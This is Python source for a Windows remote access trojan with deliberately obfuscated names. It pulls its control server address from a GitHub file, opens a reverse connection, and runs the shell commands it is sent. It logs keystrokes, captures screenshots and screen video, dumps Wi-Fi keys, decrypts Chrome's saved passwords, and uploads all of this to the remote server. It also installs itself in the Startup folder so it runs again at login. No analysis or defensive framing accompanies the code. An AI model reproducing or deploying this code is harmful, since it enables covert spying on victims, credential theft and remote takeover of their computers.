import subprocess,socket,time,requests,os,logging,imageio,json,sqlite3,win32crypt,base64,shutil
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from datetime import datetime
from Cryptodome.Cipher import AES
LgsJvKZwM = ""
yIBmkOZ = ""
CPzQcLaBIsaorGyL = "16.12.24.3"
ezQTmskopHfREAQWQWYqnJD = "!"
DIBqzdTAoGuFkukcqQw = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
UjHaEwNhgrJYPWQ = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
gBWsEWinqhW = os.path.expanduser("~\\AppData\\Local\\")
def kMFahyCXOPdMI(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def UoNMPftGtYnaNGymLPeIb(s):
	iOKszwqrzrhTDENNf = s.recv(1024)
	if len(iOKszwqrzrhTDENNf)==0:
		return True
	oQqdaJNqDUFEv = iOKszwqrzrhTDENNf.decode("utf-8").replace("\n","")
	if not oQqdaJNqDUFEv.startswith(ezQTmskopHfREAQWQWYqnJD):
		proc = subprocess.run(oQqdaJNqDUFEv, shell=True, capture_output=True)
		KuoXBceJEnBVjDowCYmstwM = proc.stdout + proc.stderr
		s.send(KuoXBceJEnBVjDowCYmstwM)
		return
	tqnhGHULxUKNE = oQqdaJNqDUFEv.split(" ")[0][1:]
	args = " ".join(oQqdaJNqDUFEv.split()[1:]).split()
	if tqnhGHULxUKNE == "download":
		rKuZRcOVgKfwimuYvoc(s, oQqdaJNqDUFEv)
	elif tqnhGHULxUKNE == "screenshot":
		UvPylToksaktCb(s)
	elif tqnhGHULxUKNE == "basename":
		s.send(bytes(os.path.basename(__file__)+"\n", "utf-8"))
	elif tqnhGHULxUKNE == "update":
		bmybVUAIzODt(s)
	elif tqnhGHULxUKNE == "wifi":
		NRSrYByjiwXX(s)
	elif tqnhGHULxUKNE == "screenrecord":
		HUgUvUI(s, args)
	elif tqnhGHULxUKNE == "chrome":
		decryptPasswords(s)
def rKuZRcOVgKfwimuYvoc(s, oQqdaJNqDUFEv):
	uhfPQgYTnVo = oQqdaJNqDUFEv.replace(ezQTmskopHfREAQWQWYqnJD+"download ","").split(",")
	KuoXBceJEnBVjDowCYmstwMs = ""
	for f in uhfPQgYTnVo:
		KuoXBceJEnBVjDowCYmstwMs += KLtpSwZLUv(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(bytes(KuoXBceJEnBVjDowCYmstwMs, "utf-8"))
def UvPylToksaktCb(s):
	image = ImageGrab.grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	gwovDaDWMTAwWyFNzK = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	image.save(gwovDaDWMTAwWyFNzK)
	image.close()
	r = KLtpSwZLUv(gwovDaDWMTAwWyFNzK, "api/sscap")
	os.remove(gwovDaDWMTAwWyFNzK)
	s.send(bytes(r,"utf-8"))
def HUgUvUI(s, args):
	BZpHsZBtFJajiiwnpKyexMV = 15
	if not args == []:
		try: BZpHsZBtFJajiiwnpKyexMV = int(args[0])
		except: pass
	kFddaXAEwUSYzXQ = os.path.expanduser("~\\AppData\\Local\\")+"sr.mp4"
	neoZjuanpN = []
	fps = 11
	numFrames = BZpHsZBtFJajiiwnpKyexMV * fps
	for _ in range(numFrames):
		neoZjuanpN.append(ImageGrab.grab(bbox=None, all_screens=True))
	imageio.mimsave(kFddaXAEwUSYzXQ, neoZjuanpN, fps=fps, quality=8)
	KLtpSwZLUv(kFddaXAEwUSYzXQ, "api/screc")
def KLtpSwZLUv(nsygEcVjwhbHYxYSw, lOREyBdhFhcEoiPfGOurX, jSognHWHsBk=None):
	if not os.path.isfile(nsygEcVjwhbHYxYSw):
		return "[!] 404: "+nsygEcVjwhbHYxYSw+"\n"
	headers = {"user":os.getlogin()}
	if jSognHWHsBk is not None:
		headers = {**headers, **jSognHWHsBk}
	f = open(nsygEcVjwhbHYxYSw, "rb")
	requests.post("http://"+LgsJvKZwM+":5555/"+lOREyBdhFhcEoiPfGOurX,
		files={"file":f},
		headers=headers)
	f.close()
	return "[+] 200\n"
def bmybVUAIzODt(s):
	h, p, v = eMPhHjxwQKnTuvU(True)
	if (v != CPzQcLaBIsaorGyL):
		SxroygSERoiYv(v)
		s.send(b"[+] 200\n")
	else:
		s.send(b"[-] 304\n")
def NRSrYByjiwXX(s):
	try:
		profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
	except:
		s.send(b"[!] 500\n")
		return
	PrbMmfPMzbYf = ""
	for p in profiles:
		try: PrbMmfPMzbYf+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()+"\n"
		except: PrbMmfPMzbYf+=f"    {p} - N/A\n"
	s.send(bytes(PrbMmfPMzbYf, "utf-8"))
def SxroygSERoiYv(YEwKpCks):
	qmEnohdORGSEzvQKiJT = os.path.basename(__file__)
	fileType = qmEnohdORGSEzvQKiJT.split(".")[-1]
	rlzAgcfXaEpXM = qmEnohdORGSEzvQKiJT.split(".")[0]+"."+YEwKpCks+".pyw" if fileType.startswith("py") else ".exe"
	RNVqKjaywzJGdLCaVLbvCQ = os.path.join(os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), rlzAgcfXaEpXM)
	if not os.path.isfile(RNVqKjaywzJGdLCaVLbvCQ):
		with open(RNVqKjaywzJGdLCaVLbvCQ, "w+") as f:
			f.write(requests.get(UjHaEwNhgrJYPWQ+"file."+ "pyw" if RNVqKjaywzJGdLCaVLbvCQ.split(".")[-1].startswith("py") else "exe").text)
def eMPhHjxwQKnTuvU(force=False):
	global LgsJvKZwM, yIBmkOZ
	if force or LgsJvKZwM == "" or yIBmkOZ == "":
		iOKszwqrzrhTDENNf = requests.get(DIBqzdTAoGuFkukcqQw).text.replace("\n","").split(":")
		LgsJvKZwM = iOKszwqrzrhTDENNf[0].strip()
		yIBmkOZ = iOKszwqrzrhTDENNf[1].strip()
		YEwKpCks = iOKszwqrzrhTDENNf[2].strip()
	return LgsJvKZwM, yIBmkOZ, YEwKpCks
def NoCkwSCPq():
	try:
		XTSRXrFUavv = "settings.xpb"
		heGCkgaYhI = sorted([file for file in os.listdir(gBWsEWinqhW) if os.path.isfile(gBWsEWinqhW+"\\"+file) and file.endswith(XTSRXrFUavv.split(".")[-1])])
		if XTSRXrFUavv in heGCkgaYhI:
			heGCkgaYhI.remove(XTSRXrFUavv)
		DpXCYUcCxqBaCWJraPeZKy = os.path.join(gBWsEWinqhW,XTSRXrFUavv)
		if len(heGCkgaYhI) > 0:
			with open(DpXCYUcCxqBaCWJraPeZKy, "ab+") as f:
				for file in heGCkgaYhI:
					temp = os.path.join(gBWsEWinqhW,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		KLtpSwZLUv(DpXCYUcCxqBaCWJraPeZKy, "api/log")
		if os.path.isfile(DpXCYUcCxqBaCWJraPeZKy):
			os.remove(DpXCYUcCxqBaCWJraPeZKy)
	except:
		pass
def JvezRkoSofudVyagkf():
	logging.basicConfig(filename=(gBWsEWinqhW+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def ZoDPLTDQdcvQOwRtzjGz(k):
		logging.info(str(k))
	k=Listener(on_press=ZoDPLTDQdcvQOwRtzjGz)
	bZZICScOpaIZDAfldM = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in bZZICScOpaIZDAfldM:
		l.setLevel(logging.CRITICAL)
	k.start()
def decryptPasswords(s):
	local = os.path.expanduser("~\\AppData\\Local\\")
	basePath = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\")
	enckey = None
	with open(basePath+"Local State", "r") as f:
		localstate = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
		enckey = win32crypt.CryptUnprotectData(localstate,None,None,None,0)[1]
	shutil.copyfile(basePath+"\\Default\\Login Data", local+"\\db.db")
	conn = sqlite3.connect(local+"\\db.db")
	cursor = conn.cursor()
	cursor.execute("SELECT action_url, username_value, password_value FROM logins")
	logins = []
	for index, login in enumerate(cursor.fetchall()):
		ciphertext = login[2]
		initVector = ciphertext[3:15]
		encryptedPwd = ciphertext[15:-16]
		cipher = AES.new(enckey, AES.MODE_GCM, initVector)
		decryptedPwd = (cipher.decrypt(encryptedPwd)).decode()
		logins.append([login[0], login[1], decryptedPwd])
	cursor.close()
	conn.close()
	os.remove(local+"\\db.db")
	iOKszwqrzrhTDENNf = "\n"
	for login in logins:
		iOKszwqrzrhTDENNf += f"URL: {login[0]}\nUser: {login[1]}\nValue: {login[2]}\n\n"
	s.send(iOKszwqrzrhTDENNf)
def rimLrrOwfveOBqBcV():
	h, p, v = eMPhHjxwQKnTuvU()
	NoCkwSCPq()
	if CPzQcLaBIsaorGyL != v:
		SxroygSERoiYv(v)
	JvezRkoSofudVyagkf()
	jufOIntzQfgGYjsEaMAKq = bytes(("(old)"if CPzQcLaBIsaorGyL!=v else "")+"["+CPzQcLaBIsaorGyL+"] - "+os.getlogin()+" >> ", "utf-8")
	while True:
		try:
			while True:
				AfltdPw=False
				try:
					s=kMFahyCXOPdMI(h, p)
					while not AfltdPw:
						s.send(jufOIntzQfgGYjsEaMAKq)
						AfltdPw=UoNMPftGtYnaNGymLPeIb(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
rimLrrOwfveOBqBcV()
